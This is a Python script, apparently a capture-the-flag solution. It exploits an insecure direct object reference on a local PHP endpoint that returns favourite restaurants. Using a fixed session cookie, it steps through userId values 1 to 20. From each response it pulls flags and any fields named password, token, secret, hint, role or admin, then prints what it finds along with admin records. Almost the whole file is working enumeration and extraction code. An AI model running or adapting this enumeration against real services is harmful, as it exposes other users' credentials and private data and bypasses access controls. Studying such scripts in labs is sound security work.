import requests
import json
import re

BASE_URL = "http://127.0.0.1:33156"
API_ENDPOINT = "/api/get_favorite_restaurants.php"

def search_data(data_text, user_id):
    """Search for flags and sensitive data"""
    results = {'flags': [], 'sensitive': []}
    
    # Search for flags
    flags = re.findall(r'FLAG\{[^}]+\}', data_text)
    results['flags'] = flags
    
    # Try to parse JSON
    try:
        data = json.loads(data_text)
        if isinstance(data, dict):
            # Search for sensitive keywords
            keywords = ['password','hint','secret','token','admin','role']
            for key, value in data.items():
                for kw in keywords:
                    if kw in key.lower():
                        results['sensitive'].append({'field': key, 'value': value})
                        
            # Check admin data
            if user_id == 7:
                results['admin'] = data
    except:
        pass
    
    return results

# Setup session
cookie = {"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"}
session = requests.Session()
session.cookies.update(cookie)

# Test endpoint first
print("Testing endpoint...")
test_url = f"{BASE_URL}{API_ENDPOINT}?userId=1"

try:
    resp = session.get(test_url, timeout=10)
    print(f"Test response: {resp.status_code}")
    
    # Begin enumeration
    flags_found = []
    admin_data = None
    all_sensitive = []
    
    for user_id in range(1, 21):
        try:
            url = f"{BASE_URL}{API_ENDPOINT}?userId={user_id}"
            resp = session.get(url, timeout=10)
            
            results = search_data(resp.text, user_id)
            
            if results['flags']:
                for flag in results['flags']:
                    flags_found.append({'user_id': user_id, 'flag': flag})
                    print(f"FOUND FLAG at userId={user_id}: {flag}")
            
            if 'admin' in results:
                admin_data = results['admin']
                print(f"ADMIN DATA (userId={user_id}): {json.dumps(admin_data)}")
            
            if results['sensitive']:
                for item in results['sensitive']:
                    all_sensitive.append({'user_id': user_id, 'data': item})
                    print(f"SENSITIVE userId={user_id}: {item['field']}={item['value']}")
            
            print(f"userId={user_id}: status={resp.status_code} size={len(resp.text)}B")
            
        except Exception as e:
            print(f"userId={user_id}: ERROR - {str(e)}")
    
    # Final report
    print(f"\nTOTAL FLAGS: {len(flags_found)}")
    if flags_found:
        for item in flags_found:
            print(f"  User {item['user_id']}: {item['flag']}")
    
    print(f"\nADMIN DATA: {'FOUND' if admin_data else 'NOT FOUND'}")
    if admin_data:
        print(json.dumps(admin_data, indent=2))
    
    print(f"\nSENSITIVE FIELDS: {len(all_sensitive)}")
    if all_sensitive:
        for item in all_sensitive:
            print(f"  User {item['user_id']}: {item['data']['field']}={item['data']['value']}")
    
except Exception as e:
    print(f"Endpoint test failed: {str(e)}")
    print("Unable to access API endpoint")
